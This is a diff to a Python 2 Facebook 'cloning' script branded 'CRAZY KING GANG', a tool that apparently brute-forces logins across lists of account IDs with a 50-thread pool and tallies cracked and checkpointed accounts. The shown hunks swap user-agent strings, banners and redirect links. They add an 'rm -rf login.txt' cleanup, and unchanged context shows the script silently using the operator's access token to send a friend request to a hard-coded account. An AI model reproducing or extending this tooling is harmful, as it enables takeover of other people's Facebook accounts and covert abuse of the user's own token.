@@ -17,7 +17,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 
 def keluar():
@@ -58,15 +58,15 @@ logo ="""
             |  |   | (   ) | | |   | |
          |\_)  )   | )   ( | | )   ( |
          (____/    |/     \| |/     \|
-  ● CRAZY KING GANG ● (BLACK LISTED UNITY) ●
---------------------------------------------------------------
+   ● CRAZY KING GANG (BLACK LISTED UNITY) ●
+------------------------------------------------------
 \x1b[1;92m➣  YouTube  : JAM SHAHRUKH TECHNICAL
 \x1b[1;92m➣  Facebook : JAM SHAHRUKH X MUSKAN NOOR
 \x1b[1;92m➣  Note     : Dont ReEdit It 
 \x1b[1;92m➣  Github   : https://github.com/Jam302/King
 \x1b[1;92m➣  Whatsapp : +923053176060
 \x1b[1;92m➣  Note     : Having Problem? Contact Me On Whatsapp.
-\x1b[1;97m--------------------------------------------------------------"""
+\x1b[1;97m------------------------------------------------------"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -125,7 +125,7 @@ def methodlogin():
 		hopa.close()
 		print "\n[✓] Logged In Successfully."
 		time.sleep(1)
-		os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+		os.system('xdg-open https://www.facebook.com/ch.imran.7370')
 		menu()
 	if 'checkpoint' in url:
 	        print("\n\x1b[1;31mYour Account is on Checkpoint")
@@ -181,7 +181,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://www.facebook.com/ch.imran.7370')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -229,7 +229,7 @@ def menu():
 	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
 	
-	print "\033[1;97m---------------------------------------------------------"
+	print "\033[1;97m-------------------------------------------------"
 		
 	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
       
@@ -318,7 +318,7 @@ def pilih_super():
 		print("\r\033[1;97m[✔] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
         print"""
 [!] To Stop Process Press CTRL Then Z
----------------------------------------------------------"""		
+-------------------------------------------------"""		
 			
 	def main(arg):
 		global cekpoint,oks
@@ -448,15 +448,16 @@ def pilih_super():
 		
 	p = ThreadPool(50)
 	p.map(main, id)
-	print "\033[1;97m---------------------------------------------------"
+	print "\033[1;97m-------------------------------------------"
 	
 	print '\033[1;97mProcess Has Been Completed.'
 	print"\033[1;97m-----------------"
 	print"\033[1;97mTotal OK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;97m---------------------------------------------------"
+	print "\033[1;97m-------------------------------------------"
 	
 	
 	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
+	os.system('rm -rf login.txt')
 	menu()
 
 if __name__ == '__main__':
